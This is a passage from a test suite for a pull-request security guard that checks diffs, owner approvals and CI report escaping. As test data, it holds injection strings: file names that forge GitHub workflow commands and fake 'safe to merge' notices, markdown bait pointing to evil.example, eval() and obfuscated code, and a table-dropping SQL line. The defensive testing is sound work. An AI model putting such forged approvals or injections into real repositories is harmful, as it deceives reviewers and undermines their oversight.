    assert.equal(details(found, "new-env"), "ADMIN_SIGNER_KEY | NEXT_PUBLIC_NEW");
  });

  test("encoded blobs and very long lines need a person", () => {
    assert.deepEqual(rules(check({ "app/src/lib/blob.ts": `export const data = "${"QUJD".repeat(120)}";\n` })), ["opaque"]);
    assert.deepEqual(rules(check({ "app/src/lib/min.js": `var a=1;${"a=a+1;".repeat(400)}\n` })), ["opaque"]);
    assert.deepEqual(rules(check({ "app/src/lib/obf.js": "var _0x4f2a=['log'];\n" })), ["opaque"]);
  });

  test("security headers, deploy files, migrations and policy files need an owner", () => {
    assert.deepEqual(rules(check({ "app/src/lib/security-headers.ts": "export const csp = \"default-src *\";\n" })), ["security-config"]);
    assert.deepEqual(rules(check({ "app/Dockerfile": "FROM node:22-slim\nRUN true\n" })), ["build-deploy"]);
    assert.deepEqual(rules(check({ "app/db/schema.sql": "drop table launches;\n" })), ["build-deploy"]);
    assert.deepEqual(rules(check({ "app/scripts/fix.mjs": "console.log(1);\n" })), ["build-deploy"]);
    assert.deepEqual(rules(check({ "SECURITY.md": "Report to help@elsewhere.example.com\n" })), ["policy"]);
    assert.deepEqual(rules(check({ ".gitattributes": "*.sol linguist-vendored\n" })), ["git-config"]);
  });

  test("static pages, scripts and .well-known files served by the site need an owner", () => {
    assert.deepEqual(rules(check({ "app/public/sw.js": "self.addEventListener('fetch', () => {});\n" })), ["security-config"]);
    assert.deepEqual(rules(check({ "app/public/.well-known/farcaster.json": '{ "accountAssociation": {} }\n' })), ["security-config"]);
    assert.deepEqual(rules(check({ "app/public/claim.html": "<h1>Claim</h1>\n" })), ["security-config"]);
  });

  test("anything in the served folder that is not a plain image, font or text file needs an owner", () => {
    // a browser runs script in whatever is served as HTML or XML, and it does not go by the letter case of a name
    const page = '<h:html xmlns:h="http://www.w3.org/1999/xhtml"><h:body><h:p>Claim</h:p></h:body></h:html>\n';
    for (const path of ["app/public/promo.xht", "app/public/feed.rss", "app/public/style.xsl", "app/public/claim.HTML", "app/public/data.json", "app/public/tokens"]) {
      assert.deepEqual(rules(check({ [path]: page })), ["security-config"], path);
    }
    assert.deepEqual(rules(check({ "app/public/brand/new.svg": BASE["app/public/brand/base.svg"] })), ["security-config"]);
    assert.deepEqual(rules(check({ "app/public/notes.txt": "plain text\n" })), []);
    assert.deepEqual(rules(check({ "app/public/brand/new.png": PNG })), []);
    // markup the app serves from outside that folder (its icon, its sitemap, its manifest), whatever the case of the name
    assert.deepEqual(rules(check({ "app/src/app/icon.svg": '<svg viewBox="0 0 1 1"><path d="M0 0h1v1z"/></svg>\n' })), ["security-config"]);
    assert.deepEqual(rules(check({ "app/src/app/sitemap.xml": "<urlset/>\n" })), ["security-config"]);
    assert.deepEqual(rules(check({ "app/src/assets/Mark.SVG": '<svg viewBox="0 0 1 1"><path d="M0 0h1v1z"/></svg>\n' })), ["security-config"]);
    assert.deepEqual(rules(check({ "app/src/app/manifest.json": '{ "name": "openlaunch" }\n' })), ["security-config"]);
    assert.deepEqual(rules(check({ "app/src/lib/chains.json": '{ "base": 8453 }\n' })), [], "data the code imports is not a served file");
  });

  test("a line too long to match is flagged instead of skipped, and hidden characters in it are still found", () => {
    const long = `export const x = "${"ab ".repeat(4000)}";`;
    assert.match(details(check({ "app/src/lib/long.ts": `${long}\n` }), "opaque"), /too long to match against the rules/);
    assert.deepEqual(rules(check({ "app/src/lib/long.ts": `${long}${cp(0x202e)}\n` })), ["hidden-unicode", "opaque"]);
  });

  test("a flood of findings in one file is cut short, and a block among them is kept", () => {
    const found = check({ "app/src/lib/flood.ts": `${"eval(x);\n".repeat(300)}const y = "${cp(0x200b)}";\n` });
    assert.equal(of(found, "dangerous-code").length, 199);
    assert.equal(of(found, "hidden-unicode").length, 1);
    assert.match(details(found, "unscanned"), /101 more findings in this file are not listed/);
  });

  test("thousands of emoji joiners on one line are checked without slowing down", () => {
    const started = Date.now();
    assert.equal(hiddenCharacter(cp(0x1f468, 0x200d, 0x1f469).repeat(200_000)), null);
    assert.ok(Date.now() - started < 5000);
  });

  test("a file made executable is noted", () => {
    assert.match(details(check({ "app/src/lib/run.ts": { content: "export {};\n", mode: 0o755 } }), "build-deploy"), /marked executable/);
  });

  test("an ordinary change passes with no findings", () => {
    assert.deepEqual(check({
      "app/src/components/Hero.tsx": "export function Hero() {\n  return <h1 className=\"text-xl\">Launch should be open and free.</h1>;\n}\n",
      "app/src/components/hero.test.ts": 'import test from "node:test";\ntest("hero renders", () => {});\n',
      "README.md": "# openlaunch\n\nLaunch should be open and free. Docs: https://openlaunch.lol/agents\n\nThanks to everyone who helped.\n",
      "docs/guide.md": "## Guide\n\nRun `npm test`.\n",
    }), []);
  });

  test("only the lines a pull request adds are judged", () => {
    const bio = "export const Bio = () => <p dangerouslySetInnerHTML={{ __html: bio }} />;\n";
    git(["checkout", "-q", "-f", "--detach", baseSha]);
    const sinkBase = commit({ "app/src/components/Bio.tsx": bio }, "base with an existing sink");
    const head = commit({ "app/src/components/Bio.tsx": `// a comment above\n${bio}` }, "pull request");
    assert.deepEqual(analyze(openRepo(dir, sinkBase, head), { lockedPaths: LOCKED }), []);
  });

  test("a file name that looks like a git pathspec is still read", () => {
    assert.deepEqual(rules(check({ "app/src/:(exclude)x.ts": "eval(input);\n" })), ["dangerous-code"]);
  });

  test("the pull request is compared with where it branched, not with later commits on main", () => {
    const head = pullRequest({ "docs/guide.md": "## Guide\n" });
    git(["checkout", "-q", "-f", "--detach", baseSha]);
    const laterMain = commit({ "contracts/src/LaunchFactoryArc.sol": "contract LaunchFactoryArc {}\n", ".github/workflows/ci.yml": "name: ci\n# later\n" }, "main moved on");
    assert.deepEqual(analyze(openRepo(dir, laterMain, head), { lockedPaths: LOCKED }), []);
  });
});

// ---------- parsing ----------

describe("parsing", () => {
  test("parseHunks numbers added lines and keeps removed ones", () => {
    const diff = ["diff --git a/x b/x", "--- a/x", "+++ b/x", "@@ -2 +2,2 @@", "-old", "+new one\r", "+new two", "@@ -9,0 +11 @@ context", "+++ not a header", "\\ No newline at end of file"].join("\n");
    assert.deepEqual(parseHunks(diff), { added: [{ n: 2, text: "new one" }, { n: 3, text: "new two" }, { n: 11, text: "++ not a header" }], removed: ["old"] });
  });

  test("lines that look like diff headers inside the file do not confuse it", () => {
    const found = check({ "app/src/components/Hero.tsx": `${BASE["app/src/components/Hero.tsx"]}@@ -1 +1 @@\n+++ b/x\neval(x);\n` });
    assert.deepEqual(rules(found), ["dangerous-code"]);
    assert.equal(found[0].line, 6);
  });
});

// ---------- approval and verdict ----------

describe("verdict", () => {
  const HEAD = "a".repeat(40), OLD = "b".repeat(40);
  const owner = OWNERS[0];
  const review = (login, state, commit_id, submitted_at) => ({ id: Date.parse(submitted_at), user: { login }, state, commit_id, submitted_at });
  const block = { tier: "block", rule: "contract-locked", path: "contracts/src/LaunchFactory.sol", detail: "edited", line: null };
  const sensitive = { tier: "review", rule: "address", path: "app/src/lib/launchpad/config.ts", detail: `${STRANGER} (new to the repository)`, line: 2 };

  test("an owner's approval of the head commit counts", () => {
    assert.equal(ownerApproval([review(owner, "APPROVED", HEAD, "2026-10-11T01:00:00Z")], OWNERS, HEAD), owner);
    assert.equal(ownerApproval([review(owner.toUpperCase(), "APPROVED", HEAD, "2026-10-11T01:00:00Z")], OWNERS, HEAD), owner);
  });

  test("an approval of an earlier commit does not: a push after approval needs a new one", () => {
    assert.equal(ownerApproval([review(owner, "APPROVED", OLD, "2026-10-11T01:00:00Z")], OWNERS, HEAD), null);
  });

  test("anyone else's approval does not count", () => {
    assert.equal(ownerApproval([review("someone", "APPROVED", HEAD, "2026-10-11T01:00:00Z"), review(`${owner}x`, "APPROVED", HEAD, "2026-10-11T01:00:00Z")], OWNERS, HEAD), null);
  });

  test("the owner's latest verdict wins; a comment is not a verdict", () => {
    const approved = review(owner, "APPROVED", HEAD, "2026-10-11T01:00:00Z");
    assert.equal(ownerApproval([approved, review(owner, "CHANGES_REQUESTED", HEAD, "2026-10-11T02:00:00Z")], OWNERS, HEAD), null);
    assert.equal(ownerApproval([review(owner, "DISMISSED", HEAD, "2026-10-11T02:00:00Z"), approved], OWNERS, HEAD), null);
    assert.equal(ownerApproval([approved, review(owner, "COMMENTED", HEAD, "2026-10-11T02:00:00Z")], OWNERS, HEAD), owner);
    assert.equal(ownerApproval([review(owner, "CHANGES_REQUESTED", OLD, "2026-10-11T00:00:00Z"), approved], OWNERS, HEAD), owner);
  });

  test("nothing found passes", () => {
    assert.deepEqual(verdict([], { author: "someone", pusher: "someone" }), { outcome: "pass", ok: true, blocks: 0, reviews: 0, byOwner: false, ownPr: false, approvedBy: null });
  });

  test("a sensitive change from a contributor waits for an owner", () => {
    assert.equal(verdict([sensitive], { author: "someone", pusher: "someone" }).outcome, "review");
    assert.equal(verdict([sensitive], { author: "someone", pusher: "someone" }).ok, false);
    const approved = verdict([sensitive], { author: "someone", pusher: "someone", approvedBy: owner });
    assert.deepEqual([approved.outcome, approved.ok, approved.approvedBy], ["pass", true, owner]);
  });

  test("on an owner's own pull request a sensitive change is a notice", () => {
    const result = verdict([sensitive], { author: owner, pusher: owner });
    assert.deepEqual([result.outcome, result.ok, result.ownPr], ["pass", true, true]);
  });

  test("an owner's pull request that someone else pushed to is treated like anyone's", () => {
    const held = verdict([sensitive], { author: owner, pusher: "collaborator" });
    assert.deepEqual([held.outcome, held.ok, held.byOwner, held.ownPr], ["review", false, true, false]);
    assert.equal(verdict([sensitive], { author: "collaborator", pusher: owner }).ok, false);
  });

  test("a head commit with no known pusher is nobody's: the owner starting the run does not make it theirs", () => {
    assert.equal(verdict([sensitive], { author: owner, pusher: "" }).ok, false);
    assert.equal(verdict([sensitive], { author: owner }).ok, false);
    assert.equal(verdict([sensitive], { author: owner, pusher: null }).ok, false);
  });

  test("the pusher of a commit is read from the branch's activity log", () => {
    const log = [
      { activity_type: "push", before: OLD, after: HEAD, actor: { login: "collaborator" } },
      { activity_type: "branch_creation", before: "0".repeat(40), after: OLD, actor: { login: owner } },
    ];
    assert.equal(pusherOf(log, HEAD), "collaborator");
    assert.equal(pusherOf(log, OLD), owner);
    assert.equal(pusherOf(log, "c".repeat(40)), null, "a commit the log does not list has no known pusher");
    assert.equal(pusherOf([{ after: HEAD, actor: null }], HEAD), null);
    assert.equal(pusherOf({ message: "Not Found" }, HEAD), null);
  });

  test("a block stays a block: no owner, no approval, nothing turns it into a pass", () => {
    for (const context of [{ author: owner, pusher: owner }, { author: "someone", pusher: "someone", approvedBy: owner }, { author: owner, pusher: owner, approvedBy: owner }]) {
      const result = verdict([block, sensitive], context);
      assert.deepEqual([result.outcome, result.ok], ["block", false]);
    }
  });

  test("every rule has a tier, a title and a reason", () => {
    for (const [rule, meta] of Object.entries(RULES)) {
      assert.ok(["block", "review"].includes(meta.tier) && meta.title && meta.help, rule);
    }
  });
});

// ---------- report ----------

describe("report", () => {
  const HEAD = "c".repeat(40);
  const sensitive = { tier: "review", rule: "new-host", path: "app/src/lib/track.ts", detail: "collect.metrics-cdn.io", line: 4 };

  test("the summary says what happened and what to do next", () => {
    const waiting = renderSummary([sensitive], verdict([sensitive], { author: "someone", pusher: "someone" }), { headSha: HEAD });
    assert.match(waiting, /^## pr-guard: needs an owner's approval/);
    assert.match(waiting, /approves commit `ccccccc` with a pull request review, then re-runs this job/);
    assert.match(waiting, /^- `app\/src\/lib\/track\.ts`: `collect\.metrics-cdn\.io` \(line 4\)$/m);
    assert.match(renderText([sensitive], verdict([sensitive], {})), /^ {6}- app\/src\/lib\/track\.ts: collect\.metrics-cdn\.io \(line 4\)$/m);
    assert.match(renderSummary([], verdict([], {}), { headSha: HEAD }), /^## pr-guard: passed/);
    const blocked = [{ tier: "block", rule: "ci-config", path: ".github/workflows/ci.yml", detail: "changed", line: null }];
    assert.match(renderSummary(blocked, verdict(blocked, {}), { headSha: HEAD }), /^## pr-guard: blocked/);
  });

  test("an owner's pull request that waits is told the way through that GitHub allows", () => {
    const held = renderSummary([sensitive], verdict([sensitive], { author: OWNERS[0], pusher: "collaborator" }), { headSha: HEAD });
    assert.match(held, /^## pr-guard: needs an owner's approval/);
    assert.match(held, /commit `ccccccc` does not count as an owner's push\. \*\*To pass:\*\* an owner reads the points below and pushes the next commit/);
    assert.doesNotMatch(held, /approves commit `ccccccc` with a pull request review, then re-runs/, "an author cannot approve their own pull request");
    assert.match(renderText([sensitive], verdict([sensitive], { author: OWNERS[0], pusher: "collaborator" })), /^ {2}an owner's pull request, held because the head commit does not count as an owner's push$/m);
    const own = renderSummary([sensitive], verdict([sensitive], { author: OWNERS[0], pusher: OWNERS[0] }), { headSha: HEAD });
    assert.match(own, /^## pr-guard: passed\n\nAn owner's own pull request, and an owner pushed `ccccccc`\./);
  });

  test("a detail from the pull request is shown as code, so it cannot write a link or HTML into the summary", () => {
    const bait = "[Approved, merge here](https://evil.example) <img src=x> `tick`";
    const found = [
      ...lintManifest("app/package.json", manifest({ dependencies: { sharp: "^0.35.4", viem: "^2.47.6", [bait]: "^1.0.0" }, scripts: { test: "tsx --test", build: "next build", [bait]: "true" } }), manifest({})),
      ...scanLines("app/src/lib/x.ts", [{ n: 3, text: `const v = process.env["${bait.replace(/`/g, "")}"];` }], [], { addresses: new Set(), hosts: new Set(["evil.example"]), env: new Set() }),
    ].map((f) => ({ ...f, tier: RULES[f.rule].tier }));
    assert.deepEqual(rules(found), ["dependencies", "new-env"]);
    const summary = renderSummary(found, verdict(found, {}), { headSha: HEAD });
    const items = summary.split("\n").filter((line) => line.startsWith("- "));
    assert.equal(items.length, 2);
    for (const item of items) {
      assert.match(item, /Approved, merge here/);
      // outside the code spans there is nothing left of it: no bracket, no tag, no address
      assert.doesNotMatch(item.replace(/`[^`]*`/g, ""), /[[\]<>]|https?:/, item);
      assert.doesNotMatch(item, /`tick`/, "a backtick in the detail cannot close the span");
    }
    // the job log is plain text, so there it is printed as it is
    assert.ok(renderText(found, verdict(found, {})).includes(`npm script "${bait}" added`));
  });

  test("a file name cannot be read from the job log as a workflow command", () => {
    // the runner takes "::command::" at the start of a line, spaces aside, and "##[command]" anywhere in one
    const names = ["::notice title=pr-guard%3A passed::Approved by an owner, safe to merge", "::stop-commands::x", "docs/##[error]forged.md"];
    const found = names.map((path) => ({ ...sensitive, path, detail: "##[warning]forged too" }));
    const log = renderText(found, verdict(found, {}));
    assert.match(log, /^ {6}- ::notice title=pr-guard%3A passed::Approved by an owner, safe to merge: /m, "the name is still shown");
    for (const line of log.split("\n")) assert.doesNotMatch(line, /^\s*::|##\[/, line);
  });

  test("text from the pull request cannot break out of the report", () => {
    const path = "app/src/x`.ts\n::error::owned";
    assert.equal(plain(path), "app/src/x`.ts ::error::owned");
    const summary = renderSummary([{ ...sensitive, path }], verdict([sensitive], {}), { headSha: HEAD });
    assert.ok(!summary.includes("x`.ts"), "backticks are replaced inside code spans");
    assert.ok(!/\n::error/.test(summary));
    assert.equal(plain(`a${cp(0x202e)}b${cp(0x1b)}c`), "a?b c");
    assert.equal(plain("x".repeat(500)).length, 201);
  });

  test("an annotation escapes its message and leaves out an odd file name", () => {
    const line = annotation("error", { path: "app/src/a.ts", line: 3, title: "pr-guard: x, y: z" }, "50% done\nnext::line");
    assert.equal(line, "::error title=pr-guard%3A x%2C y%3A z,file=app/src/a.ts,line=3::50%25 done next::line");
    assert.ok(!annotation("error", { path: "a,b\n::warning::x", line: 1, title: "t" }, "m").includes("file="));
    assert.equal(annotation("warning", { path: "a.ts", line: null, title: "t" }, "m").split("\n").length, 1);
  });
});

// ---------- the command itself ----------

describe("command line", () => {
  const run = (args) => spawnSync(process.execPath, [GUARD, "--repo", dir, "--lock", lockFile, ...args], { encoding: "utf8", env: { ...process.env, GITHUB_ACTIONS: "", GITHUB_STEP_SUMMARY: "", PR_NUMBER: "", GITHUB_REPOSITORY: "" } });

  test("exit codes follow the verdict", () => {
    const clean = pullRequest({ "docs/guide.md": "## Guide\n" });
    assert.equal(run(["--base", baseSha, "--head", clean, "--author", "someone"]).status, 0);

    const sensitive = pullRequest({ "app/src/lib/launchpad/config.ts": BASE["app/src/lib/launchpad/config.ts"].replace(ROUTER, STRANGER) });
    const waiting = run(["--base", baseSha, "--head", sensitive, "--author", "someone"]);
    assert.equal(waiting.status, 1);
    assert.match(waiting.stdout, /pr-guard: review {2}\(0 blocking, 1 for review\)/);
    assert.equal(run(["--base", baseSha, "--head", sensitive, "--author", "someone", "--approved"]).status, 0);
    assert.equal(run(["--base", baseSha, "--head", sensitive, "--author", OWNERS[0]]).status, 0);
    assert.equal(run(["--base", baseSha, "--head", sensitive, "--author", OWNERS[0], "--pusher", "collaborator"]).status, 1);

    const blocked = pullRequest({ "contracts/src/LaunchFactory.sol": "contract LaunchFactory { address owner; }\n" });
    assert.equal(run(["--base", baseSha, "--head", blocked, "--author", OWNERS[0], "--approved"]).status, 1);
  });

  test("--json carries the findings", () => {
    const head = pullRequest({ ".github/workflows/ci.yml": "name: ci\n# edited\n" });
    const out = JSON.parse(run(["--base", baseSha, "--head", head, "--author", "someone", "--json"]).stdout);
    assert.equal(out.result.outcome, "block");
    assert.deepEqual(out.notes, []);
    assert.deepEqual(out.findings.map((f) => [f.rule, f.path]), [["ci-config", ".github/workflows/ci.yml"]]);
  });

  test("a long report reaches a pipe whole", () => {
    const head = pullRequest(Object.fromEntries(Array.from({ length: 12 }, (_, i) => [`app/src/lib/flood${i}.ts`, "eval(x);\n".repeat(190)])));
    const piped = run(["--base", baseSha, "--head", head, "--author", "someone", "--json"]);
    assert.ok(piped.stdout.length > 250_000, "longer than a pipe holds, on Linux as on a Mac");
    assert.equal(JSON.parse(piped.stdout).findings.length, 12 * 190);
    assert.equal(piped.status, 1);
  });

  test("a file named like a workflow command starts no line of the output", () => {
    const head = pullRequest({ "::notice title=pr-guard%3A passed::safe to merge": "eval(x);\n" });
    const result = run(["--base", baseSha, "--head", head, "--author", "someone"]);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /^ {6}- ::notice title=pr-guard%3A passed::safe to merge: eval\(\) \(line 1\)$/m);
    for (const line of result.stdout.split("\n")) assert.doesNotMatch(line, /^\s*::/, line);
  });

  test("when the guard itself cannot finish, the check fails", () => {
    const missingHead = run(["--base", baseSha, "--head", "f".repeat(40), "--author", OWNERS[0]]);
    assert.equal(missingHead.status, 1);
    assert.match(missingHead.stdout, /could not finish, so the check fails/);
    const noLock = spawnSync(process.execPath, [GUARD, "--repo", dir, "--lock", join(dir, "nope.lock"), "--base", baseSha, "--head", baseSha], { encoding: "utf8" });
    assert.equal(noLock.status, 1);
    const emptyLock = join(dirname(lockFile), "empty.lock");
    writeFileSync(emptyLock, "# nothing\n");
    assert.equal(spawnSync(process.execPath, [GUARD, "--repo", dir, "--lock", emptyLock, "--base", baseSha, "--head", baseSha], { encoding: "utf8" }).status, 1);
  });

  test("inside Actions it writes a summary and annotations", () => {
    const summary = join(dirname(lockFile), "summary.md");
    writeFileSync(summary, "");
    const head = pullRequest({ ".github/workflows/ci.yml": "name: ci\n# edited\n", "app/src/lib/t.ts": 'fetch("https://collect.metrics-cdn.io");\n' });
    const result = spawnSync(process.execPath, [GUARD, "--repo", dir, "--lock", lockFile, "--base", baseSha, "--head", head, "--author", "someone"], { encoding: "utf8", env: { ...process.env, GITHUB_ACTIONS: "true", GITHUB_STEP_SUMMARY: summary, PR_NUMBER: "", GITHUB_REPOSITORY: "" } });
    assert.equal(result.status, 1);
    assert.match(result.stdout, /^::error title=pr-guard%3A CI%2C the guard or code owners changed,file=\.github\/workflows\/ci\.yml::/m);
    assert.match(result.stdout, /^::warning title=pr-guard%3A A host the repository has not used before,file=app\/src\/lib\/t\.ts,line=1::/m);
    assert.match(readFileSync(summary, "utf8"), /## pr-guard: blocked/);
  });
});

// ---------- the command inside Actions, with GitHub to ask ----------

describe("who pushed the head commit, and who approved it", () => {
  const owner = OWNERS[0], OLD = "b".repeat(40);
  let server, api, head, state;
  /** Answer a request to the stand-in API with JSON. */
  const reply = (res, status, body) => { res.writeHead(status, { "content-type": "application/json" }); res.end(JSON.stringify(body)); };
  /** A branch's activity log, newest first: `login` pushed the head on top of a commit the owner pushed. */
  const pushedBy = (login) => [{ activity_type: "push", before: OLD, after: head, actor: { login } }, { activity_type: "branch_creation", before: "0".repeat(40), after: OLD, actor: { login: owner } }];
  /** The pull request's reviews: one approval, by the owner, of `commit_id`. */
  const approvalOf = (commit_id) => [{ id: 1, user: { login: owner }, state: "APPROVED", commit_id, submitted_at: "2026-10-12T01:00:00Z" }];

  /** Run the guard as the workflow does, against a stand-in for the GitHub API. `answers` is what GitHub would say. */
  const guard = (answers, env = {}) => new Promise((done) => {
    state = { asked: [], activity: [], reviews: [], ...answers };
    const options = { encoding: "utf8", env: { ...process.env, GITHUB_ACTIONS: "true", GITHUB_STEP_SUMMARY: "", GITHUB_API_URL: api, GITHUB_REPOSITORY: "o/r", GITHUB_TOKEN: "", PR_NUMBER: "7", PR_AUTHOR: owner, EVENT_ACTION: "opened", EVENT_AFTER: "", EVENT_SENDER: owner, ...env } };
    execFile(process.execPath, [GUARD, "--repo", dir, "--lock", lockFile, "--base", baseSha, "--head", head], options, (error, stdout) => done({ status: error ? error.code : 0, stdout, asked: state.asked }));
  });

  before(async () => {
    head = pullRequest({ "app/src/lib/launchpad/config.ts": BASE["app/src/lib/launchpad/config.ts"].replace(ROUTER, STRANGER) });
    server = createServer((req, res) => {
      const url = new URL(req.url, "http://github.test");
      const what = url.pathname.replace("/repos/o/r/", "");
      state.asked.push(what);
      if (state.down) return reply(res, 503, {});
      if (what === "pulls/7") return reply(res, 200, { head: { sha: state.movedTo ?? head, ref: "feature/x", repo: { full_name: "o/r" } } });
      if (what === "activity" && url.searchParams.get("ref") === "refs/heads/feature/x") return reply(res, 200, state.activity);
      if (what === "pulls/7/reviews") return reply(res, 200, state.reviews);
      return reply(res, 404, {});
    });
    await new Promise((listening) => server.listen(0, "127.0.0.1", listening));
    api = `http://127.0.0.1:${server.address().port}`;
  });
  after(() => new Promise((closed) => server.close(closed)));

  test("an owner opens a pull request from a branch they pushed: the sensitive change is a notice", async () => {
    const result = await guard({ activity: [{ activity_type: "branch_creation", before: "0".repeat(40), after: head, actor: { login: owner } }] });
    assert.equal(result.status, 0);
    assert.match(result.stdout, /pr-guard: pass {2}\(0 blocking, 1 for review\)/);
    assert.match(result.stdout, /^::notice title=pr-guard%3A On-chain address,/m);
    assert.deepEqual(result.asked, ["pulls/7", "activity"]);
  });

  test("an owner reopens a pull request that someone else pushed to while it was closed: it waits", async () => {
    const result = await guard({ activity: pushedBy("collaborator") }, { EVENT_ACTION: "reopened" });
    assert.equal(result.status, 1);
    assert.match(result.stdout, /pr-guard: review {2}\(0 blocking, 1 for review\)/);
    assert.deepEqual(result.asked, ["pulls/7", "activity", "pulls/7/reviews"]);
  });

  test("an owner opens a pull request from a branch someone else pushed: it waits", async () => {
    assert.equal((await guard({ activity: pushedBy("collaborator") })).status, 1);
    assert.equal((await guard({ activity: pushedBy(owner) })).status, 0);
  });

  test("a push names its pusher, so nothing is asked: the owner's passes, anyone else's waits", async () => {
    const own = await guard({ activity: pushedBy("collaborator") }, { EVENT_ACTION: "synchronize", EVENT_AFTER: head });
    assert.deepEqual([own.status, own.asked], [0, []]);
    const other = await guard({ activity: pushedBy(owner) }, { EVENT_ACTION: "synchronize", EVENT_AFTER: head, EVENT_SENDER: "collaborator" });
    assert.deepEqual([other.status, other.asked], [1, ["pulls/7/reviews"]]);
  });

  test("a push event whose commit is no longer the head does not speak for the head: the log is asked", async () => {
    const overtaken = await guard({ activity: pushedBy("collaborator") }, { EVENT_ACTION: "synchronize", EVENT_AFTER: OLD });
    assert.deepEqual([overtaken.status, overtaken.asked], [1, ["pulls/7", "activity", "pulls/7/reviews"]]);
    assert.equal((await guard({ activity: pushedBy(owner) }, { EVENT_ACTION: "synchronize", EVENT_AFTER: OLD })).status, 0);
    assert.equal((await guard({ activity: pushedBy("collaborator") }, { EVENT_ACTION: "synchronize" })).status, 1, "a push event that names no commit");
  });

  test("when GitHub cannot say who pushed the commit, it is nobody's", async () => {
    const down = await guard({ down: true });
    assert.equal(down.status, 1);
    assert.match(down.stdout, /note: Could not confirm who pushed [0-9a-f]{7} \(HTTP 503\), so it is not counted as an owner's push\./);
    assert.match((await guard({ activity: [] })).stdout, /\(the branch's activity log does not list that push\)/);
    assert.match((await guard({ activity: pushedBy(owner), movedTo: OLD })).stdout, /\(the pull request's head is now another commit\)/);
    const nothingToAsk = await guard({ activity: pushedBy(owner) }, { PR_NUMBER: "" });
    assert.deepEqual([nothingToAsk.status, nothingToAsk.asked], [1, []]);
    assert.match(nothingToAsk.stdout, /\(this run has no pull request to ask about\)/);
  });

  test("a contributor's pull request passes on an owner's approval of the head commit, and only of that commit", async () => {
    const approved = await guard({ reviews: approvalOf(head) }, { PR_AUTHOR: "someone", EVENT_SENDER: "someone" });
    assert.deepEqual([approved.status, approved.asked], [0, ["pulls/7/reviews"]]);
    assert.equal((await guard({ reviews: approvalOf(OLD) }, { PR_AUTHOR: "someone", EVENT_SENDER: "someone" })).status, 1);
    assert.equal((await guard({}, { PR_AUTHOR: "someone", EVENT_SENDER: owner, EVENT_ACTION: "reopened" })).status, 1, "an owner reopening it is not an approval");
    const unread = await guard({ down: true }, { PR_AUTHOR: "someone", EVENT_SENDER: "someone" });
    assert.equal(unread.status, 1);
    assert.match(unread.stdout, /Could not read the pull request's reviews \(HTTP 503\), so no approval was counted\./);
  });
});
